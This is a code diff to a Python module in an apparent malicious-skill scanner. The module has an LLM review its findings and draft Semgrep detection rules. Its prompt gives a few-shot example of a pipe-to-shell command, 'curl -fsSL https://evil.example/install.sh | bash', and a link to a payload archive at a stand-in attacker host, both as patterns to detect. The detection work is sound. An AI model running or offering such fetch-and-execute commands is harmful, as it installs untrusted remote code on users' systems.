@@ -8,9 +8,12 @@ from dataclasses import dataclass
 from pathlib import Path
 from typing import Any
 
+import yaml
+
+from .. import llm_runtime
 from ..llm_runtime import build_llm_runtime_config, invoke_structured_json
-from ..models import ArtifactRecord, EvidenceRecord
-from .schema import EVIDENCE_TYPE_BY_SUBTYPE
+from ..models import ArtifactRecord, SSOFinding
+from .schema import SSO_CATEGORY_BY_SUBTYPE, canonical_sso_category
 
 REVIEWABLE_ARTIFACT_TYPES = {
     "python",
@@ -22,6 +25,21 @@ REVIEWABLE_ARTIFACT_TYPES = {
     "prompt",
     "config",
     "manifest",
+}
+FEEDBACK_PROMPT_VERSION = "2026-07-27-v2"
+
+RULE_REVIEW_CATEGORY_PRIORITY = {
+    "privilege_and_identity_manipulation": 0,
+    "defense_evasion_and_anti_forensics": 0,
+    "impact_and_destruction": 0,
+    "persistence_and_startup_control": 1,
+    "lateral_movement_and_remote_execution": 1,
+    "process_and_memory_manipulation": 1,
+    "payload_execution": 2,
+    "credential_and_secret_access": 3,
+    "network_and_remote_communication": 4,
+    "file_and_data_access": 5,
+    "host_and_environment_discovery": 5,
 }
 
 STRUCTURAL_MARKERS = (
@@ -103,18 +121,18 @@ DISALLOWED_PROSE_ONLY_MARKERS = (
     "visit",
 )
 
-FEEDBACK_SYSTEM_PROMPT = """You are reviewing LLM-only evidence facts to decide whether they should be hardened into Semgrep rules.
+FEEDBACK_SYSTEM_PROMPT = """You are reviewing LLM-only SSO findings to decide whether they should be hardened into Semgrep rules.
 
 You must do two things:
-1. Decide whether the evidence can be captured by a stable Semgrep rule.
+1. Decide whether the findings can be captured by a stable Semgrep rule.
 2. If yes, synthesize one precise Semgrep rule draft in this repository's format.
 
 Core principle:
 - Only propose Semgrep rules for structurally codifiable patterns.
-- Reject evidence that depends mainly on natural-language semantics, cross-sentence interpretation, or human intent inference.
+- Reject findings that depends mainly on natural-language semantics, cross-sentence interpretation, or human intent inference.
 - Precision is more important than recall.
 
-Evidence taxonomy:
+Finding taxonomy:
 - payload_execution: direct_process_execution, shell_interpreter_execution, script_host_execution, dynamic_module_load, proxy_execution_or_lolbin_abuse
 - process_and_memory_manipulation: process_attach, cross_process_memory_read, cross_process_memory_write, remote_thread_or_async_execution, executable_memory_mapping, process_hollowing_or_image_replacement
 - persistence_and_startup_control: startup_or_logon_persistence, service_or_daemon_persistence, scheduled_persistence, event_triggered_persistence, boot_chain_persistence
@@ -133,8 +151,7 @@ Semgrep rule format requirements:
 - Include exactly one rule object.
 - Include `id`, `languages`, `message`, `severity`, `metadata`.
 - `metadata.malskills_subtype` must equal the provided subtype.
-- `metadata.malskills_evidence_type` must equal the provided evidence type.
-- Do not use `malskills_confidence`.
+- `metadata.malskills_sso_category` must equal the provided findings type.
 - Use only stable syntax, command tokens, URLs, file extensions, code fences, markdown link structure, or AST-like patterns.
 - For markdown/prompt artifacts, never write a rule that matches ordinary prose guidance. Only match structured code blocks, explicit commands, or structured markdown links to payloads/scripts/archives.
 
@@ -145,23 +162,23 @@ Hard rejection criteria:
 - rules based on ordinary English instructions rather than code or command structure
 
 Positive examples:
-1. Evidence:
+1. Finding:
    matched_text = "curl -fsSL https://evil.example/install.sh | bash"
    decision = propose_rule
    reason = explicit shell pipeline with stable command tokens and URL
 
-2. Evidence:
+2. Finding:
    matched_text = "[installer](https://evil.example/tool.zip)"
    decision = propose_rule
    reason = structured markdown link to a payload archive
 
 Negative examples:
-1. Evidence:
+1. Finding:
    matched_text = "Visit this page, copy the installation script and paste it into Terminal."
    decision = reject
    reason = requires semantic interpretation of prose; no stable command text is present
 
-2. Evidence:
+2. Finding:
    matched_text = "run the executable before proceeding"
    decision = reject
    reason = no stable executable name or command syntax to anchor a precise Semgrep rule
@@ -175,10 +192,10 @@ Output contract:
 
 @dataclass(frozen=True)
 class FeedbackInput:
-    evidence_id: str
+    finding_id: str
     artifact_path: str
     artifact_type: str
-    evidence_type: str
+    category: str
     subtype: str
     matched_text: str
     start_line: int
@@ -187,7 +204,7 @@ class FeedbackInput:
     artifact_excerpt: str
 
 
-class EvidenceFeedbackAnalyzer:
+class SSOFindingFeedbackAnalyzer:
     def __init__(self, cache_dir: str | Path | None = None, max_reviews: int = 8) -> None:
         default_cache = Path(".cache") / "malskills_llm_feedback"
         configured = cache_dir or os.environ.get("MALSKILLS_LLM_FEEDBACK_CACHE") or default_cache
@@ -196,28 +213,38 @@ class EvidenceFeedbackAnalyzer:
         self.max_reviews = max(1, int(os.environ.get("MALSKILLS_LLM_FEEDBACK_MAX_REVIEWS", max_reviews)))
         self.runtime = build_llm_runtime_config()
 
-    def analyze(self, artifacts: list[ArtifactRecord], evidence: list[EvidenceRecord]) -> dict[str, object]:
+    def analyze(
+        self,
+        artifacts: list[ArtifactRecord],
+        findings: list[SSOFinding],
+        *,
+        semgrep_findings: list[SSOFinding] | None = None,
+        llm_findings: list[SSOFinding] | None = None,
+    ) -> dict[str, object]:
         artifact_by_path = {artifact.relative_path: artifact for artifact in artifacts}
-        semgrep_keys = {self._evidence_key(item) for item in evidence if item.producer == "semgrep"}
+        semgrep_records = semgrep_findings if semgrep_findings is not None else [
+            item for item in findings if item.producer == "semgrep"
+        ]
+        llm_records = llm_findings if llm_findings is not None else [
+            item for item in findings if item.producer == "llm"
+        ]
         llm_only_hits: list[dict[str, object]] = []
         feedback_inputs: list[FeedbackInput] = []
 
-        for item in evidence:
-            if item.producer != "llm":
+        for item in llm_records:
+            if str(item.provenance.get("analysis_stage", "")).strip() != "sso_extraction":
                 continue
-            if str(item.provenance.get("analysis_stage", "")).strip() != "evidence_extraction":
-                continue
-            if self._evidence_key(item) in semgrep_keys:
+            if self._covered_by_semgrep(item, semgrep_records):
                 continue
             artifact = artifact_by_path.get(item.artifact_path)
             artifact_type = artifact.artifact_type if artifact is not None else "unknown"
-            matched_text = str(item.attributes.get("matched_text", "")).strip()
+            matched_text = item.matched_text.strip()
             llm_only_hits.append(
                 {
-                    "evidence_id": item.evidence_id,
+                    "finding_id": item.finding_id,
                     "artifact_path": item.artifact_path,
                     "artifact_type": artifact_type,
-                    "type": item.evidence_type,
+                    "type": item.category,
                     "subtype": item.subtype,
                     "span": {
                         "start_line": item.span.start_line if item.span else None,
@@ -230,7 +257,16 @@ class EvidenceFeedbackAnalyzer:
             if candidate is not None:
                 feedback_inputs.append(candidate)
 
-        reviews = self._review_candidates(feedback_inputs[: self.max_reviews])
+        prioritized_inputs = sorted(
+            feedback_inputs,
+            key=lambda candidate: (
+                RULE_REVIEW_CATEGORY_PRIORITY.get(candidate.category, 99),
+                candidate.artifact_path,
+                candidate.start_line,
+                candidate.finding_id,
+            ),
+        )
+        reviews = self._review_candidates(prioritized_inputs[: self.max_reviews])
         candidates = self._group_candidates(reviews)
         return {
             "llm_only_hits": llm_only_hits,
@@ -252,7 +288,7 @@ class EvidenceFeedbackAnalyzer:
 
     def _build_feedback_input(
         self,
-        item: EvidenceRecord,
+        item: SSOFinding,
         artifact: ArtifactRecord | None,
         artifact_type: str,
         matched_text: str,
@@ -263,15 +299,15 @@ class EvidenceFeedbackAnalyzer:
             return None
         excerpt = self._artifact_excerpt(artifact, item.span.start_line if item.span else 1, item.span.end_line if item.span else 1)
         return FeedbackInput(
-            evidence_id=item.evidence_id,
+            finding_id=item.finding_id,
             artifact_path=item.artifact_path,
             artifact_type=artifact_type,
-            evidence_type=item.evidence_type,
+            category=item.category,
             subtype=item.subtype,
             matched_text=matched_text,
             start_line=item.span.start_line if item.span else 1,
             end_line=item.span.end_line if item.span else 1,
-            suggested_rule_path=self._suggested_rule_path(artifact_type, item.evidence_type),
+            suggested_rule_path=self._suggested_rule_path(artifact_type, item.category),
             artifact_excerpt=excerpt,
         )
 
@@ -293,7 +329,9 @@ class EvidenceFeedbackAnalyzer:
             cwd=Path.cwd(),
             config=self.runtime,
         )
-        review = self._normalize_review(candidate, payload if isinstance(payload, dict) else {})
+        if not isinstance(payload, dict):
+            return None
+        review = self._normalize_review(candidate, payload)
         self._store_cached_review(candidate, review)
         return review
 
@@ -303,7 +341,7 @@ class EvidenceFeedbackAnalyzer:
             decision = "reject"
         payload_type = str(payload.get("type", "")).strip()
         payload_subtype = str(payload.get("subtype", "")).strip()
-        if payload_type and payload_type != candidate.evidence_type:
+        if payload_type and payload_type != candidate.category:
             decision = "reject"
         if payload_subtype and payload_subtype != candidate.subtype:
             decision = "reject"
@@ -314,8 +352,8 @@ class EvidenceFeedbackAnalyzer:
         rule_id = str(payload.get("rule_id", "")).strip()
         rule_yaml = str(payload.get("rule_yaml", "")).strip()
         confidence = self._clamp_float(payload.get("confidence", 0.0))
-        if decision == "reject" and not rejection_reason and (payload_type != candidate.evidence_type or payload_subtype != candidate.subtype):
-            rejection_reason = "LLM feedback changed the evidence taxonomy label; rejected."
+        if decision == "reject" and not rejection_reason and (payload_type != candidate.category or payload_subtype != candidate.subtype):
+            rejection_reason = "LLM feedback changed the SSO taxonomy label; rejected."
 
         if decision == "propose_rule":
             valid, validator_reason = self._validate_rule(candidate, suggested_rule_path, rule_id, rule_yaml)
@@ -331,10 +369,10 @@ class EvidenceFeedbackAnalyzer:
             rejection_reason = rationale or "Not structurally codifiable as a Semgrep rule."
 
         return {
-            "evidence_id": candidate.evidence_id,
+            "finding_id": candidate.finding_id,
             "artifact_path": candidate.artifact_path,
             "artifact_type": candidate.artifact_type,
-            "type": candidate.evidence_type,
+            "type": candidate.category,
             "subtype": candidate.subtype,
             "decision": decision,
             "pattern_class": pattern_class,
@@ -367,11 +405,11 @@ class EvidenceFeedbackAnalyzer:
             groups.setdefault(key, []).append(review)
         payload: list[dict[str, object]] = []
         for key, items in sorted(groups.items()):
-            artifact_type, evidence_type, subtype, pattern_class, suggested_rule_path, rule_id = key
+            artifact_type, category, subtype, pattern_class, suggested_rule_path, rule_id = key
             payload.append(
                 {
                     "artifact_type": artifact_type,
-                    "type": evidence_type,
+                    "type": category,
                     "subtype": subtype,
                     "pattern_class": pattern_class,
                     "suggested_rule_path": suggested_rule_path,
@@ -382,7 +420,7 @@ class EvidenceFeedbackAnalyzer:
                     "rule_yaml": items[0]["rule_yaml"],
                     "examples": [
                         {
-                            "evidence_id": item["evidence_id"],
+                            "finding_id": item["finding_id"],
                             "artifact_path": item["artifact_path"],
                             "span": item["span"],
                             "matched_text": item["matched_text"],
@@ -405,20 +443,33 @@ class EvidenceFeedbackAnalyzer:
         if not rule_id or not rule_yaml:
             return False, "Missing rule identifier or rule YAML."
         lowered = rule_yaml.lower()
-        if "rules:" not in rule_yaml or "metadata:" not in rule_yaml or "severity:" not in rule_yaml:
+        try:
+            payload = yaml.safe_load(rule_yaml)
+        except yaml.YAMLError:
+            return False, "Rule YAML cannot be parsed safely."
+        if not isinstance(payload, dict) or not isinstance(payload.get("rules"), list) or len(payload["rules"]) != 1:
+            return False, "Rule YAML must contain exactly one Semgrep rule."
+        rule = payload["rules"][0]
+        if not isinstance(rule, dict):
+            return False, "Rule YAML contains an invalid rule object."
+        metadata = rule.get("metadata")
+        if not isinstance(metadata, dict) or "severity" not in rule:
             return False, "Rule YAML is missing required Semgrep sections."
-        if "malskills_confidence" in lowered:
-            return False, "Rule YAML must not emit malskills_confidence."
-        if f"malskills_subtype: {candidate.subtype}" not in rule_yaml:
+        if str(metadata.get("malskills_subtype", "")) != candidate.subtype:
             return False, "Rule YAML metadata.malskills_subtype is inconsistent."
-        if f"malskills_evidence_type: {candidate.evidence_type}" not in rule_yaml:
-            return False, "Rule YAML metadata.malskills_evidence_type is inconsistent."
-        if rule_id not in rule_yaml:
+        metadata_type = canonical_sso_category(
+            candidate.subtype,
+            str(metadata.get("malskills_sso_category", "")),
+        )
+        if metadata_type != candidate.category:
+            return False, "Rule YAML metadata.malskills_sso_category is inconsistent."
+        if str(rule.get("id", "")) != rule_id:
             return False, "Rule YAML does not contain the declared rule_id."
-        if not any(token in lowered for token in ("pattern:", "pattern-either:", "pattern-regex:")):
+        if not set(rule) & {"pattern", "patterns", "pattern-either", "pattern-regex", "mode"}:
             return False, "Rule YAML must contain at least one Semgrep pattern clause."
         expected_languages = self._expected_languages(candidate.artifact_type)
-        if f"languages: [{expected_languages}]" not in lowered and f"languages: [{expected_languages}, " not in lowered:
+        languages = rule.get("languages")
+        if not isinstance(languages, list) or expected_languages not in [str(item).lower() for item in languages]:
             return False, "Rule YAML uses languages inconsistent with repository conventions."
         if candidate.artifact_type in {"markdown", "prompt"}:
             if not any(marker in lowered for marker in MARKDOWN_RULE_MARKERS):
@@ -428,16 +479,16 @@ class EvidenceFeedbackAnalyzer:
         return True, ""
 
     def _build_review_prompt(self, candidate: FeedbackInput) -> str:
-        return f"""Review this LLM-only evidence fact for Semgrep hardening.
+        return f"""Review this LLM-only SSO finding for Semgrep hardening.
 
 Repository rule destination:
 - suggested_rule_path: {candidate.suggested_rule_path}
 
-Evidence:
-- evidence_id: {candidate.evidence_id}
+Finding:
+- finding_id: {candidate.finding_id}
 - artifact_type: {candidate.artifact_type}
 - artifact_path: {candidate.artifact_path}
-- evidence_type: {candidate.evidence_type}
+- category: {candidate.category}
 - subtype: {candidate.subtype}
 - matched_text: {candidate.matched_text}
 - span: {candidate.start_line}-{candidate.end_line}
@@ -447,16 +498,15 @@ Artifact excerpt:
 
 Decision requirements:
 - `propose_rule` only if you can write a precise rule based on stable syntax or structured command/link forms.
-- `reject` if the evidence depends on prose understanding, hidden intent, or contextual semantics that Semgrep cannot capture cleanly.
+- `reject` if the finding depends on prose understanding, hidden intent, or contextual semantics that Semgrep cannot capture cleanly.
 - Prefer a narrow high-precision rule over a broad heuristic.
 
 If you propose a rule:
 - Use repository-style metadata keys:
   - `malskills_subtype: {candidate.subtype}`
-  - `malskills_evidence_type: {candidate.evidence_type}`
-- Do not include `malskills_confidence`
+  - `malskills_sso_category: {candidate.category}`
 - Keep the rule minimal and structural
-- The rule_id should start with `{candidate.artifact_type}.{candidate.evidence_type}.{candidate.subtype}.`
+- The rule_id should start with `{candidate.artifact_type}.{candidate.category}.{candidate.subtype}.`
 
 Return JSON only following the provided schema.
 """
@@ -489,11 +539,14 @@ Return JSON only following the provided schema.
         digest = hashlib.sha256(
             "|".join(
                 [
+                    FEEDBACK_PROMPT_VERSION,
+                    llm_runtime.LLM_RUNTIME_PROTOCOL_VERSION,
                     self.runtime.backend,
                     self.runtime.model,
+                    self.runtime.reasoning_effort,
                     candidate.artifact_path,
                     candidate.artifact_type,
-                    candidate.evidence_type,
+                    candidate.category,
                     candidate.subtype,
                     candidate.matched_text,
                     candidate.artifact_excerpt,
@@ -502,21 +555,45 @@ Return JSON only following the provided schema.
         ).hexdigest()
         return self.cache_dir / f"{digest}.json"
 
-    def _suggested_rule_path(self, artifact_type: str, evidence_type: str) -> str:
+    def _suggested_rule_path(self, artifact_type: str, category: str) -> str:
         bucket = artifact_type
         if artifact_type == "installer":
             bucket = "shell"
         if artifact_type == "prompt":
             bucket = "markdown"
-        return f"malskills/rules/semgrep/{bucket}/{evidence_type}.yml"
+        return f"malskills/rules/semgrep/{bucket}/{category}.yml"
 
-    def _evidence_key(self, item: EvidenceRecord) -> tuple[str, str, int, int]:
+    def _finding_key(self, item: SSOFinding) -> tuple[str, str, int, int]:
         return (
             item.artifact_path,
             item.subtype,
             item.span.start_line if item.span else 0,
             item.span.end_line if item.span else 0,
         )
+
+    def _covered_by_semgrep(
+        self,
+        llm_item: SSOFinding,
+        semgrep_records: list[SSOFinding],
+    ) -> bool:
+        llm_sink = str(llm_item.attributes.get("sink_api", "")).strip()
+        llm_text = " ".join(llm_item.matched_text.split())
+        for static_item in semgrep_records:
+            if static_item.artifact_path != llm_item.artifact_path or static_item.subtype != llm_item.subtype:
+                continue
+            static_sink = str(static_item.attributes.get("sink_api", "")).strip()
+            if llm_sink and static_sink and llm_sink == static_sink:
+                return True
+            if llm_item.span and static_item.span:
+                if (
+                    llm_item.span.start_line <= static_item.span.end_line
+                    and static_item.span.start_line <= llm_item.span.end_line
+                ):
+                    return True
+            static_text = " ".join(static_item.matched_text.split())
+            if llm_text and static_text and (llm_text in static_text or static_text in llm_text):
+                return True
+        return False
 
     def _clamp_float(self, value: object) -> float:
         try:
@@ -542,8 +619,8 @@ Return JSON only following the provided schema.
 
 
 def _feedback_review_schema() -> dict[str, Any]:
-    subtype_values = sorted(EVIDENCE_TYPE_BY_SUBTYPE)
-    type_values = sorted(set(EVIDENCE_TYPE_BY_SUBTYPE.values()))
+    subtype_values = sorted(SSO_CATEGORY_BY_SUBTYPE)
+    type_values = sorted(set(SSO_CATEGORY_BY_SUBTYPE.values()))
     return {
         "type": "object",
         "additionalProperties": False,
